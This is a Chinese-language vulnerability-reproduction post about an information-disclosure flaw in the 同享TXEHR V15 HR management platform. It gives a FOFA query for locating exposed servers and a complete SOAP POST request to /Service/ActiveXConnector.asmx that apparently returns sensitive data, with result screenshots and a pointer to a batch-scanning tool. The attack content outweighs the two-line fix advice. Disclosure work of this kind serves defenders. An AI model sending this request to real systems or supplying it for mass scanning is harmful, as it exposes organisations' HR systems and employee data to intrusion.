#  【漏洞复现】同享TXEHR V15人力管理管理平台信息泄露漏洞   
原创 清风  白帽攻防   2024-11-29 01:13  
  
## 免责声明：请勿使用本文中提到的技术进行非法测试或行为。使用本文中提供的信息或工具所造成的任何后果和损失由使用者自行承担，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
简介  
  
同享软件成立于1997年，总部位于东莞南城南新产业国际。公司致力于研发和推广人力资源信息化产品，帮助企业打造统一的人力资源数字化平台，提升企业的人才管理能力和效率，促进员工的快速成长，并协助企业实现智能化决策。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eGDSkIOTSSc0q9ZO3B1EibmKG7IPl6c5AGrZC1W17Mk3AFxiafIu5yodOChJrCrDQZFbjBTZA2urjA/640?wx_fmt=png&from=appmsg "")  
  
漏洞描述  
  
同享TXEHR V15人力管理平台的Assistant/Default.aspx接口存在敏感信息泄露漏洞。  
fofa语法```
body="/Assistant/Default.aspx"
```  
漏洞复现```
POST /Service/ActiveXConnector.asmx HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: text/xml;charset=UTF-8
Content-Length: 224

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetActivexConnector/>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eGDSkIOTSSc0q9ZO3B1EibmLQSFNfyXnPkhqa1XcfwiaUcD2hp11qcv20GyaX30bIbiccyt1tV85EZA/640?wx_fmt=png&from=appmsg "")  
  
批量检测（批量检测POC工具请在公众号知识星球获取）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eGDSkIOTSSc0q9ZO3B1EibmYGjD9P0rPk6GZkfdBVnhMat6LfjVHdY3Oiby4wopUsZtjWeuib6JdtQQ/640?wx_fmt=png&from=appmsg "")  
  
修复建议  
  
  
  
  
  
1、限制访问权限  
  
2、更新或禁用不必要的功能  
  
  
  
  
  
  
  
网安交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yu6trpdUX0efFOzibVic3qjn100tFgpUIh7ib8g9cKajewKFM5kXP350q21SCLvlgO6yx1tlia8VYxI4j3cv57FqFg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
